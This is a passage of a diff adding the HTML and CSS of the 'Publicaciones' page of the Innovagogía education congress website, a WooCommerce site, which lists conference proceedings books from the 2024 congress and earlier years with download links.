+/* Cambiar fuente en descripción del producto */
+.woocommerce-product-details__short-description,
+.woocommerce-Tabs-panel {
+	font-family: 'Satoshi', sans-serif;}
+
+/* Precio en la página de producto individual */
+.woocommerce-Price-amount {
+	font-family: 'Satoshi', sans-serif;
+	font-weight: bold;
+	color: #71bdf8;
+	font-size: 1.2em;}
+
+/* Precio en la vista de catálogo */
+.price {
+	font-family: 'Satoshi', sans-serif;
+	font-size: 1em;}
+
+/* Botón en la ficha del producto */
+.single_add_to_cart_button {
+	font-family: 'Satoshi', sans-serif;
+	font-size: 1em;
+	color: #71bdf8;
+	text-transform: uppercase;}
+
+/* Botón en la vista de catálogo */
+.button.product_type_simple.add_to_cart_button {
+	font-family: 'Satoshi', sans-serif;
+	font-size: 0.9em;}
+
+.woocommerce-breadcrumb {font-family: 'Satoshi', sans-serif;}
+
+.site-main {margin-top:50px; margin-bottom:50px;}
+
+.wc-tabs li {font-family: 'Satoshi', sans-serif;
+}
+
+.products h2, h3, h4, h5, h6 {font-family: 'Satoshi', sans-serif;}
+
+.entry-title {font-family: 'Satoshi', sans-serif!important; color: #0D5187;!important; font-size:38px;!important; font-weight:bold!important;}
+
+:root :where(.wp-element-button, .wp-block-button__link) {
+    background-color: #0D5187;
+		font-weight:bold;
+    color: #fff;
+		border-radius:50px;
+    font-family: 'Satoshi', sans-serif;
+}
+
+.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) a.button {
+    font-family: 'Satoshi', sans-serif;
+    font-weight: 700;
+    border-radius: 50px;
+    left: auto;
+    color: #515151;
+    background-color: #e9e6ed;}
+
+[type=button]:hover {background-color: #71BDF8!important;}
+
+[type=button], [type=submit], button {border: 0px solid #c36 !important; }
+
+a {color: #0D5187;}
+
+/* Tipografía general en páginas WooCommerce */
+body.woocommerce, body.woocommerce-cart, body.woocommerce-checkout, body.woocommerce-account {
+   font-family: 'Satoshi', sans-serif;}
+
+.woocommerce-price-suffix {color: #1d1d1d; font-size: 1em;}
+
+/* Cambiar botón "Añadir al Carrito" */
+.woocommerce-page .single_add_to_cart_button {
+	font-family: 'Satoshi', sans-serif !important;
+	background-color: #0d5187 !important;
+	color: white !important; 
+	border: none !important; 
+	border-radius:50px !important;
+}
+
+.woocommerce-page .single_add_to_cart_button:hover {
+	font-family: 'Satoshi', sans-serif !important;
+	background-color: #71bdf8 !important; 
+	color: white !important;
+	border: none !important;
+	border-radius:50px !important;
+}
+
+		</style>
+		</head>
+<body class="wp-singular page-template-default page page-id-742 wp-embed-responsive wp-theme-hello-elementor wp-child-theme-hello-elementor-child theme-hello-elementor woocommerce-no-js hello-elementor-default elementor-default elementor-kit-7 elementor-page elementor-page-742">
+
+
+<a class="skip-link screen-reader-text" href="#content">Ir al contenido</a>
+
+		<header data-elementor-type="header" data-elementor-id="236" class="elementor elementor-236 elementor-location-header" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-ba754d7 e-flex e-con-boxed e-con e-parent" data-id="ba754d7" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;sticky&quot;:&quot;top&quot;,&quot;sticky_on&quot;:[&quot;desktop&quot;,&quot;tablet&quot;,&quot;mobile&quot;],&quot;sticky_offset&quot;:0,&quot;sticky_effects_offset&quot;:0,&quot;sticky_anchor_link_offset&quot;:0}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-d5d8ad0 e-con-full e-flex e-con e-child" data-id="d5d8ad0" data-element_type="container">
+				<div class="elementor-element elementor-element-dc2af5d elementor-widget elementor-widget-image" data-id="dc2af5d" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+																<a href="https://www.innovagogia.es/">
+							<img width="411" height="139" src="https://www.innovagogia.es/wp-content/uploads/2025/04/Marca_Innovagogia_V2.jpg" class="attachment-large size-large wp-image-384" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/04/Marca_Innovagogia_V2.jpg 411w, https://www.innovagogia.es/wp-content/uploads/2025/04/Marca_Innovagogia_V2-300x101.jpg 300w" sizes="(max-width: 411px) 100vw, 411px" />								</a>
+															</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-5ae9926 e-con-full e-flex e-con e-child" data-id="5ae9926" data-element_type="container">
+				<div class="elementor-element elementor-element-c8864e0 elementor-nav-menu__align-center elementor-nav-menu--stretch elementor-nav-menu--dropdown-tablet elementor-nav-menu__text-align-aside elementor-nav-menu--toggle elementor-nav-menu--burger elementor-widget elementor-widget-nav-menu" data-id="c8864e0" data-element_type="widget" data-settings="{&quot;full_width&quot;:&quot;stretch&quot;,&quot;layout&quot;:&quot;horizontal&quot;,&quot;submenu_icon&quot;:{&quot;value&quot;:&quot;&lt;svg aria-hidden=\&quot;true\&quot; class=\&quot;e-font-icon-svg e-fas-caret-down\&quot; viewBox=\&quot;0 0 320 512\&quot; xmlns=\&quot;http:\/\/www.w3.org\/2000\/svg\&quot;&gt;&lt;path d=\&quot;M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z\&quot;&gt;&lt;\/path&gt;&lt;\/svg&gt;&quot;,&quot;library&quot;:&quot;fa-solid&quot;},&quot;toggle&quot;:&quot;burger&quot;}" data-widget_type="nav-menu.default">
+				<div class="elementor-widget-container">
+								<nav aria-label="Menú" class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-horizontal e--pointer-underline e--animation-fade">
+				<ul id="menu-1-c8864e0" class="elementor-nav-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-509"><a href="https://www.innovagogia.es/" class="elementor-item">Inicio</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-505"><a href="https://www.innovagogia.es/quienes-somos/" class="elementor-item">Quiénes somos</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-742 current_page_item menu-item-750"><a href="https://www.innovagogia.es/publicaciones/" aria-current="page" class="elementor-item elementor-item-active">Publicaciones</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-759"><a href="https://www.innovagogia.es/organizacion/" class="elementor-item">Organización</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-765"><a href="https://www.innovagogia.es/preguntas-frecuentes/" class="elementor-item">FAQ</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-638"><a href="https://www.innovagogia.es/contacto/" class="elementor-item">Contacto</a></li>
+</ul>			</nav>
+					<div class="elementor-menu-toggle" role="button" tabindex="0" aria-label="Alternar menú" aria-expanded="false">
+			<svg aria-hidden="true" role="presentation" class="elementor-menu-toggle__icon--open e-font-icon-svg e-eicon-menu-bar" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M104 333H896C929 333 958 304 958 271S929 208 896 208H104C71 208 42 237 42 271S71 333 104 333ZM104 583H896C929 583 958 554 958 521S929 458 896 458H104C71 458 42 487 42 521S71 583 104 583ZM104 833H896C929 833 958 804 958 771S929 708 896 708H104C71 708 42 737 42 771S71 833 104 833Z"></path></svg><svg aria-hidden="true" role="presentation" class="elementor-menu-toggle__icon--close e-font-icon-svg e-eicon-close" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M742 167L500 408 258 167C246 154 233 150 217 150 196 150 179 158 167 167 154 179 150 196 150 212 150 229 154 242 171 254L408 500 167 742C138 771 138 800 167 829 196 858 225 858 254 829L496 587 738 829C750 842 767 846 783 846 800 846 817 842 829 829 842 817 846 804 846 783 846 767 842 750 829 737L588 500 833 258C863 229 863 200 833 171 804 137 775 137 742 167Z"></path></svg>		</div>
+					<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container" aria-hidden="true">
+				<ul id="menu-2-c8864e0" class="elementor-nav-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-509"><a href="https://www.innovagogia.es/" class="elementor-item" tabindex="-1">Inicio</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-505"><a href="https://www.innovagogia.es/quienes-somos/" class="elementor-item" tabindex="-1">Quiénes somos</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-742 current_page_item menu-item-750"><a href="https://www.innovagogia.es/publicaciones/" aria-current="page" class="elementor-item elementor-item-active" tabindex="-1">Publicaciones</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-759"><a href="https://www.innovagogia.es/organizacion/" class="elementor-item" tabindex="-1">Organización</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-765"><a href="https://www.innovagogia.es/preguntas-frecuentes/" class="elementor-item" tabindex="-1">FAQ</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-638"><a href="https://www.innovagogia.es/contacto/" class="elementor-item" tabindex="-1">Contacto</a></li>
+</ul>			</nav>
+						</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-85c79e4 elementor-menu-cart--empty-indicator-hide toggle-icon--cart-medium elementor-menu-cart--items-indicator-bubble elementor-menu-cart--show-subtotal-yes elementor-menu-cart--cart-type-side-cart elementor-menu-cart--show-remove-button-yes elementor-widget elementor-widget-woocommerce-menu-cart" data-id="85c79e4" data-element_type="widget" data-settings="{&quot;cart_type&quot;:&quot;side-cart&quot;,&quot;open_cart&quot;:&quot;click&quot;}" data-widget_type="woocommerce-menu-cart.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-menu-cart__wrapper">
+							<div class="elementor-menu-cart__toggle_wrapper">
+					<div class="elementor-menu-cart__container elementor-lightbox" aria-hidden="true">
+						<div class="elementor-menu-cart__main" aria-hidden="true">
+									<div class="elementor-menu-cart__close-button">
+					</div>
+									<div class="widget_shopping_cart_content">
+															</div>
+						</div>
+					</div>
+							<div class="elementor-menu-cart__toggle elementor-button-wrapper">
+			<a id="elementor-menu-cart__toggle_button" href="#" class="elementor-menu-cart__toggle_button elementor-button elementor-size-sm" aria-expanded="false">
+				<span class="elementor-button-text"><span class="woocommerce-Price-amount amount"><bdi>0,00&nbsp;<span class="woocommerce-Price-currencySymbol">&euro;</span></bdi></span></span>
+				<span class="elementor-button-icon">
+					<span class="elementor-button-icon-qty" data-counter="0">0</span>
+					<svg class="e-font-icon-svg e-eicon-cart-medium" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M740 854C740 883 763 906 792 906S844 883 844 854 820 802 792 802 740 825 740 854ZM217 156H958C977 156 992 173 989 191L957 452C950 509 901 552 843 552H297L303 581C311 625 350 656 395 656H875C892 656 906 670 906 687S892 719 875 719H394C320 719 255 666 241 593L141 94H42C25 94 10 80 10 62S25 31 42 31H167C182 31 195 42 198 56L217 156ZM230 219L284 490H843C869 490 891 470 895 444L923 219H230ZM677 854C677 791 728 740 792 740S906 791 906 854 855 969 792 969 677 918 677 854ZM260 854C260 791 312 740 375 740S490 791 490 854 438 969 375 969 260 918 260 854ZM323 854C323 883 346 906 375 906S427 883 427 854 404 802 375 802 323 825 323 854Z"></path></svg>					<span class="elementor-screen-only">Carrito</span>
+				</span>
+			</a>
+		</div>
+						</div>
+					</div> <!-- close elementor-menu-cart__wrapper -->
+						</div>
+				</div>
+		<div class="elementor-element elementor-element-950fa03 e-con-full e-flex e-con e-child" data-id="950fa03" data-element_type="container">
+				<div class="elementor-element elementor-element-7667b9a elementor-widget__width-auto elementor-view-default elementor-widget elementor-widget-icon" data-id="7667b9a" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-icon-wrapper">
+			<div class="elementor-icon">
+			<svg aria-hidden="true" class="e-font-icon-svg e-fas-search" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"></path></svg>			</div>
+		</div>
+						</div>
+				</div>
+				</div>
+					</div>
+				</div>
+				</header>
+		
+<main id="content" class="site-main post-742 page type-page status-publish hentry">
+
+	
+	<div class="page-content">
+				<div data-elementor-type="wp-page" data-elementor-id="742" class="elementor elementor-742" data-elementor-post-type="page">
+						<section class="elementor-section elementor-top-section elementor-element elementor-element-46f9df4 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="46f9df4" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+							<div class="elementor-background-overlay"></div>
+							<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-b2c0ac8" data-id="b2c0ac8" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-e822b43 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="e822b43" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-7c5a084 elementor-widget elementor-widget-heading" data-id="7c5a084" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Publicaciones</h2>				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-d653fcd elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-invisible" data-id="d653fcd" data-element_type="section" data-settings="{&quot;animation&quot;:&quot;fadeInUp&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-85e71d2" data-id="85e71d2" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-bf2e29d elementor-widget elementor-widget-heading" data-id="bf2e29d" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Publicaciones científicas Innovagogía 2024</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-16e8285 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="16e8285" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-7ece69a elementor-widget elementor-widget-heading" data-id="7ece69a" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Monográficos</h3>				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-58eb13c elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="58eb13c" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-fdc088c" data-id="fdc088c" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-4387c1c elementor-widget elementor-widget-image" data-id="4387c1c" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img fetchpriority="high" decoding="async" width="800" height="446" src="https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_1.jpg" class="attachment-large size-large wp-image-807" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_1.jpg 950w, https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_1-300x167.jpg 300w, https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_1-768x428.jpg 768w, https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_1-600x335.jpg 600w" sizes="(max-width: 800px) 100vw, 800px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-1e00874 elementor-widget elementor-widget-image" data-id="1e00874" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img decoding="async" width="537" height="537" src="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png" class="attachment-large size-large wp-image-202" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png 537w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-300x300.png 300w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-100x100.png 100w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-150x150.png 150w" sizes="(max-width: 537px) 100vw, 537px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-be8e73c elementor-widget elementor-widget-heading" data-id="be8e73c" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Innovación educativa y transformación social. Propuestas para los actuales desafíos</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-5ec09bf elementor-widget elementor-widget-text-editor" data-id="5ec09bf" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>El <strong>VII Congreso Internacional de Innovación Pedagógica y Praxis Educativa</strong>, Innovagogía 2024, celebrado del 28 al 30 de mayo, ha sido una vez más un punto de encuentro clave para profesionales de la educación de todo el mundo.</p><p>Este libro de actas recoge las aportaciones más destacadas de la línea temática 1. Educación y Sociedad: Pensamiento e innovación para la transformación social, reflejando la riqueza y la diversidad de las propuestas presentadas y el firme compromiso de la comunidad educativa con la innovación y la mejora de la praxis educativa.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-5a73ed7 elementor-widget elementor-widget-button" data-id="5a73ed7" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://www.dykinson.com/libros/innovacion-educativa-y-transformacion-social/9788410704534/" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-7e6972f" data-id="7e6972f" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-06b8f44 elementor-widget elementor-widget-image" data-id="06b8f44" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img decoding="async" width="800" height="446" src="https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_2.jpg" class="attachment-large size-large wp-image-806" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_2.jpg 950w, https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_2-300x167.jpg 300w, https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_2-768x428.jpg 768w, https://www.innovagogia.es/wp-content/uploads/2025/09/Portada_libro_Innovagogia24_2-600x335.jpg 600w" sizes="(max-width: 800px) 100vw, 800px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-9220add elementor-widget elementor-widget-image" data-id="9220add" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img decoding="async" width="537" height="537" src="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png" class="attachment-large size-large wp-image-202" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png 537w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-300x300.png 300w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-100x100.png 100w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-150x150.png 150w" sizes="(max-width: 537px) 100vw, 537px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-dc2f569 elementor-widget elementor-widget-heading" data-id="dc2f569" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Calidad e innovación pedagógica. Experiencias docentes y tecnológicas aplicadas al aula</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-a290f9d elementor-widget elementor-widget-text-editor" data-id="a290f9d" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>El <strong>VII Congreso Internacional de Innovación Pedagógica y Praxis Educativa</strong>, Innovagogía 2024<em> (línea temática 2). </em>celebrado del 28 al 30 de mayo, ha vuelto a demostrar su papel como un referente en el ámbito educativo internacional.</p><p>Este libro de actas refleja las contribuciones más destacadas a la línea temática 2. Innovación pedagógica, calidad y TIC en contextos formativos, un testimonio del compromiso de la comunidad educativa con la innovación y la excelencia pedagógica.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-7921600 elementor-widget elementor-widget-button" data-id="7921600" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://drive.google.com/file/d/1a0phtoH0cNF4q_qNGMFBXVgRT5KNP6Cw/view" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-54464b2 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-invisible" data-id="54464b2" data-element_type="section" data-settings="{&quot;animation&quot;:&quot;fadeInUp&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-4b10efa" data-id="4b10efa" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-db0fc78 elementor-widget elementor-widget-heading" data-id="db0fc78" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Publicaciones científicas anteriores</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-e428f4e elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="e428f4e" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-7956f88 elementor-widget elementor-widget-heading" data-id="7956f88" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Monográficos</h3>				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-b79474b elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="b79474b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-2af35a1" data-id="2af35a1" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-03f0093 elementor-widget elementor-widget-image" data-id="03f0093" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img loading="lazy" decoding="async" width="800" height="446" src="https://www.innovagogia.es/wp-content/uploads/2025/06/Innova_educacion.jpg" class="attachment-large size-large wp-image-322" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/06/Innova_educacion.jpg 950w, https://www.innovagogia.es/wp-content/uploads/2025/06/Innova_educacion-600x335.jpg 600w, https://www.innovagogia.es/wp-content/uploads/2025/06/Innova_educacion-300x167.jpg 300w, https://www.innovagogia.es/wp-content/uploads/2025/06/Innova_educacion-768x428.jpg 768w" sizes="(max-width: 800px) 100vw, 800px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-82e5d75 elementor-widget elementor-widget-image" data-id="82e5d75" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img decoding="async" width="537" height="537" src="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png" class="attachment-large size-large wp-image-202" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png 537w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-300x300.png 300w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-100x100.png 100w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-150x150.png 150w" sizes="(max-width: 537px) 100vw, 537px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-683e6dd elementor-widget elementor-widget-heading" data-id="683e6dd" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Educación y Sociedad. Pensamiento e innovación para la transformación social</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-76e79d3 elementor-widget elementor-widget-text-editor" data-id="76e79d3" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Se trata de una obra que ofrece una mirada crítica y práctica sobre cómo la innovación en educación puede contribuir a una sociedad más justa, democrática y sostenible.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-81a3cb3 elementor-widget elementor-widget-button" data-id="81a3cb3" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://drive.google.com/file/d/1PQYgCLLVXv-dmF-_H5FawD_fWI2IqTo6/view" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
